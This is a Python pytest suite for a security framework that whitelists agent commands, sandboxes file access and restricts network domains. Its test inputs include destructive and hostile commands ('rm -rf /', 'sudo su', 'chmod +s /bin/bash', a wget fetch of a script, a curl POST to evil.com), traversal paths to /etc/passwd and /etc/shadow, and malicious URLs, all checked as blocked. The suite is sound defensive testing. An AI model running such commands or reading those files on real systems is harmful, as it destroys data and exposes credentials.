"""
Test suite for security framework
"""

import pytest
import tempfile
import shutil
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

from tools.security_framework import (
    SecurityManager, CommandWhitelist, FileSystemSandbox, 
    NetworkSecurityManager, SecurityLevel, SecurityAction
)
from tests.security_test_utils import (
    SecureTestUtils, secure_true, secure_false, secure_not_none, 
    secure_equal, secure_in, secure_not_in, secure_length, secure_status
)


class TestCommandWhitelist:
    """Test command whitelist functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.whitelist = CommandWhitelist()
    
    def test_allowed_commands(self):
        """Test that allowed commands pass validation"""
        allowed_commands = [
            "echo hello",
            "ls -la",
            "python script.py",
            "git status",
            "npm install"
        ]
        
        for command in allowed_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            secure_true(is_allowed, f"Command should be allowed: {command}, reason: {reason}")
    
    def test_forbidden_commands(self):
        """Test that forbidden commands are blocked"""
        forbidden_commands = [
            "rm -rf /",
            "sudo su",
            "wget http://malicious.com/script.sh",
            "curl -X POST http://evil.com",
            "chmod +s /bin/bash"
        ]
        
        for command in forbidden_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            secure_false(is_allowed, f"Command should be blocked: {command}")
            secure_not_none(reason, "Reason should be provided for blocked commands")
    
    def test_dangerous_patterns(self):
        """Test detection of dangerous patterns"""
        dangerous_commands = [
            "python -c 'eval(input())'",
            "node -e 'exec(require(\"child_process\").spawn)'",
            "rm some_file -rf",
            "systemctl stop firewall"
        ]
        
        for command in dangerous_commands:
            is_allowed, reason = self.whitelist.is_command_allowed(command)
            secure_false(is_allowed, f"Dangerous pattern should be blocked: {command}")
    
    def test_custom_commands(self):
        """Test adding custom allowed commands"""
        custom_command = "my_custom_tool"
        
        # Should be blocked initially
        is_allowed, _ = self.whitelist.is_command_allowed(custom_command)
        secure_false(is_allowed, "Custom command should be blocked initially")
        
        # Add to whitelist
        self.whitelist.add_allowed_command(custom_command, "custom")
        
        # Should be allowed now
        is_allowed, _ = self.whitelist.is_command_allowed(custom_command)
        secure_true(is_allowed, "Custom command should be allowed after whitelisting")


class TestFileSystemSandbox:
    """Test file system sandbox functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.sandbox = FileSystemSandbox(self.temp_dir)
        self.test_agent_id = "test_agent"
    
    def teardown_method(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir)
    
    def test_sandbox_structure_creation(self):
        """Test that sandbox structure is created correctly"""
        expected_dirs = ["agents", "shared", "templates", "dependencies", "logs", "temp"]
        
        for directory in expected_dirs:
            dir_path = Path(self.temp_dir) / directory
            secure_true(dir_path.exists(), f"Directory should exist: {directory}")
            secure_true(dir_path.is_dir(), f"Path should be directory: {directory}")
    
    def test_agent_sandbox_creation(self):
        """Test agent-specific sandbox creation"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        
        secure_true(agent_path.exists(), "Agent path should exist")
        secure_true(agent_path.is_dir(), "Agent path should be directory")
        
        # Check subdirectories
        expected_subdirs = ["workspace", "temp", "output", "logs"]
        for subdir in expected_subdirs:
            subdir_path = agent_path / subdir
            secure_true(subdir_path.exists(), f"Agent subdir should exist: {subdir}")
    
    def test_path_validation_allowed(self):
        """Test validation of allowed paths"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        test_file_path = agent_path / "workspace" / "test.txt"
        
        is_valid, resolved_path = self.sandbox.validate_path(str(test_file_path), self.test_agent_id)
        
        secure_true(is_valid, "Path should be valid")
        secure_equal(resolved_path, test_file_path.resolve(), "Resolved path should match expected")
    
    def test_path_validation_forbidden(self):
        """Test validation blocks forbidden paths"""
        forbidden_paths = [
            "/etc/passwd",
            "/tmp/../etc/shadow",
            "../../etc/hosts",
            "/usr/bin/sudo"
        ]
        
        for path in forbidden_paths:
            is_valid, resolved_path = self.sandbox.validate_path(path, self.test_agent_id)
            secure_false(is_valid, f"Path should be blocked: {path}")
    
    def test_safe_file_operations(self):
        """Test safe file read/write operations"""
        agent_path = self.sandbox.get_agent_sandbox_path(self.test_agent_id)
        test_file = "workspace/test_file.txt"
        test_content = "Hello, sandbox world!"
        
        # Test write
        success, error = self.sandbox.safe_write_file(test_file, test_content, self.test_agent_id)
        secure_true(success, f"Write should succeed, error: {error}")
        
        # Test read
        success, content, error = self.sandbox.safe_read_file(test_file, self.test_agent_id)
        secure_true(success, f"Read should succeed, error: {error}")
        secure_equal(content, test_content, "Content should match what was written")
    
    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "workspace/../../../../../../etc/shadow",
            "workspace/../../../tmp/malicious.sh"
        ]
        
        for path in malicious_paths:
            success, error = self.sandbox.safe_write_file(path, "malicious", self.test_agent_id)
            secure_false(success, f"Malicious path should be blocked: {path}")
            
            success, content, error = self.sandbox.safe_read_file(path, self.test_agent_id)
            secure_false(success, f"Malicious path should be blocked: {path}")


class TestNetworkSecurityManager:
    """Test network security management"""
    
    def setup_method(self):
        """Setup test environment"""
        self.network_security = NetworkSecurityManager()
        self.test_agent_id = "test_agent"
    
    def test_allowed_domains(self):
        """Test that allowed domains pass validation"""
        allowed_urls = [
            "https://api.anthropic.com/v1/chat",
            "https://github.com/user/repo",
            "https://stackoverflow.com/questions/123"
        ]
        
        for url in allowed_urls:
            is_allowed, reason = self.network_security.is_domain_allowed(url)
            secure_true(is_allowed, f"URL should be allowed: {url}, reason: {reason}")
    
    def test_blocked_domains(self):
        """Test that non-allowed domains are blocked"""
        blocked_urls = [
            "https://malicious.com/steal-data",
            "http://suspicious-site.net",
            "https://unknown-domain.org/api"
        ]
        
        for url in blocked_urls:
            is_allowed, reason = self.network_security.is_domain_allowed(url)
            secure_false(is_allowed, f"URL should be blocked: {url}")
            secure_not_none(reason, "Reason should be provided for blocked URLs")
    
    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Make requests up to the limit
        for i in range(101):  # Test 101 requests against limit of 100
            is_allowed, reason = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            if i < 100:  # First 100 requests should be allowed (0-99)
                secure_true(is_allowed, f"Request {i} should be allowed")
            else:  # 101st request should be blocked
                secure_false(is_allowed, "Rate limit should be exceeded")
    
    def test_rate_limit_cleanup(self):
        """Test that old rate limit entries are cleaned up"""
        # Mock time to simulate hour passing
        with patch('time.time') as mock_time:
            # Start at time 0
            mock_time.return_value = 0
            
            # Make a request
            is_allowed, _ = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            secure_true(is_allowed, "First request should be allowed")
            
            # Move time forward by 2 hours
            mock_time.return_value = 7200  # 2 hours later
            
            # Make another request - should be allowed as old entry is cleaned
            is_allowed, _ = self.network_security.check_rate_limit(self.test_agent_id, "requests")
            secure_true(is_allowed, "Request after cleanup should be allowed")


class TestSecurityManager:
    """Test integrated security manager"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.security_manager = SecurityManager(self.temp_dir)
        self.test_agent_id = "test_agent"
    
    def teardown_method(self):
        """Clean up test environment"""
        shutil.rmtree(self.temp_dir)
    
    def test_command_validation_integration(self):
        """Test integrated command validation"""
        # Test allowed command
        is_allowed, reason = self.security_manager.validate_command_execution(
            "echo hello", self.test_agent_id
        )
        secure_true(is_allowed, "Echo command should be allowed")
        
        # Test forbidden command
        is_allowed, reason = self.security_manager.validate_command_execution(
            "rm -rf /", self.test_agent_id
        )
        secure_false(is_allowed, "Dangerous command should be blocked")
        secure_not_none(reason, "Reason should be provided for blocked commands")
    
    def test_file_access_validation_integration(self):
        """Test integrated file access validation"""
        # Test allowed path
        is_allowed, reason = self.security_manager.validate_file_access(
            "workspace/test.txt", self.test_agent_id, "read"
        )
        secure_true(is_allowed, "Workspace file access should be allowed")
        
        # Test forbidden path
        is_allowed, reason = self.security_manager.validate_file_access(
            "/etc/passwd", self.test_agent_id, "read"
        )
        secure_false(is_allowed, "System file access should be blocked")
        secure_not_none(reason, "Reason should be provided for blocked file access")
    
    def test_network_validation_integration(self):
        """Test integrated network validation"""
        # Test allowed URL
        is_allowed, reason = self.security_manager.validate_network_request(
            "https://api.anthropic.com/v1/chat", self.test_agent_id
        )
        secure_true(is_allowed, "Anthropic API should be allowed")
        
        # Test blocked URL
        is_allowed, reason = self.security_manager.validate_network_request(
            "https://malicious.com/steal", self.test_agent_id
        )
        secure_false(is_allowed, "Malicious URL should be blocked")
        secure_not_none(reason, "Reason should be provided for blocked URLs")
    
    def test_security_reporting(self):
        """Test security report generation"""
        # Generate some security events
        self.security_manager.validate_command_execution("rm -rf /", self.test_agent_id)
        self.security_manager.validate_file_access("/etc/passwd", self.test_agent_id, "read")
        
        # Generate report
        report = self.security_manager.get_security_report(24)
        
        secure_in("total_events", report, "Report should contain total_events")
        secure_in("events_by_type", report, "Report should contain events_by_type")
        secure_in("events_by_severity", report, "Report should contain events_by_severity")
        
        if "total_events" in report:
            secure_true(report["total_events"] >= 2, "Should have at least our test events")
    
    def test_security_event_logging(self):
        """Test security event logging"""
        # Trigger a security event
        self.security_manager.validate_command_execution("sudo su", self.test_agent_id)
        
        # Check if event was logged
        recent_events = self.security_manager.security_logger.get_recent_events(1)
        secure_true(len(recent_events) > 0, "Should have logged security events")
        
        # Check event details
        event = recent_events[-1]  # Last event
        secure_equal(event.event_type, "command_blocked", "Event type should be command_blocked")
        secure_equal(event.agent_id, self.test_agent_id, "Agent ID should match")
        secure_equal(event.action_taken, SecurityAction.DENY, "Action should be DENY")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
